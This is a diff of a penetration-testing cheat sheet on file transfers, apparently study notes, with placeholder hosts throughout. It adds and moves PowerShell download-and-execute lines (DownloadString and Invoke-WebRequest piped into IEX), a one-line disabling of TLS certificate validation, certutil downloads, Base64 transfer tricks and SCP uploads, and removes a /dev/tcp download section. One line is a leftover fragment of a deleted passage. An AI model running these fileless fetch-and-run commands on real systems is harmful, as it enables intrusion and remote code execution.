@@ -71,6 +71,19 @@ certutil -urlcache -f "URL" "filename"
 IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
 # We can also pipe the input directly into IEX
 (New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX
+
+# Powershell 3.0 and Later using Invoke-WebRequest
+Invoke-WebRequest <Target File URL> -OutFile <Output_File_Name>
+```
+**Common Errors with Powershell**  
+Internet Explorer first-launch configuration not being completed will prevent downloads. To bypass, use `-UseBasicParsing`
+```
+Invoke-WebRequest <Target file URL> -UseBasicParsing | IEX
+```
+SSL/TLS secure channel throws an error if the certificate is not trusted.  
+Bypass:
+```
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
 ### Web Upload
 - Server Setup
@@ -87,26 +100,22 @@ curl -X POST <URL> -F 'files=@<path_to_file>' -F 'files=@<path_to_file>' --insec
 ```
 
 ## Base64 Encode/Decode
+### Linux
 ```
 #Base64 Encode
 cat <file> |base64 -w 0;echo
 #Base64 Decode
 echo -n '<encoded data>' | base64 -d > <filename>
 ```
-## Download with Bash (/dev/tcp)
-Connect to the target
-```bash
-exec 3<>/dev/tcp/<IP>/<port>
+### Windows
 ```
-Craft a GET request
-```bash
-echo -e "Get /<filename> HTTP/1.1\n\n">&3
+#Base64 Encode
+[Convert]::ToBase64String((Get-Content -path "File_to_Encode" -Encoding byte))
+#Base64 Decode
+[IO.File]::WriteAllBytes("Output_File", [Convert]::FromBase64String("Base64_Encoded_Payload"))
 ```
-Print the response
-```bash
-cat <&3
-```
-## SSH Downloads
+## SSH
+### Downloads
 Enable the ssh server
 ```bash
 sudo systemctl enable ssh
@@ -123,30 +132,11 @@ Download via SCP
 ```bash
 scp plaintext@<IP>:/<path>/<filename> .
 ```
-## SCP Upload
+### Upoads
 ```bash
 scp <local_file> <user>@<IP>:<Desination_path_to_save_the_file>
 ```
-# Windows File Transfers
-## PowerShell Base64 Encode/Decode
-```powershell
-#Base64 Encode
-[Convert]::ToBase64String((Get-Content -path "File_to_Encode" -Encoding byte))
-#Base64 Decode
-[IO.File]::WriteAllBytes("Output_File", [Convert]::FromBase64String("Base64_Encoded_Payload"))
-```
-## PowerShell Web Downloads
-1. Files vs. Fileless  
-a. Files = Download and save the file  
-b. Fileless = Download and execute without saving the file 
-```powershell
-# File Download Example
-(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
-(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
-
-# Fileless Download Example
-IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
-# We can also pipe the input directly into IEX
+put directly into IEX
 (New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX
 ``` 
 Powershell v3.0 and later can use Invoke-WebRequest(by default is aliased to ```iwr```,```curl```, and ```wget```)
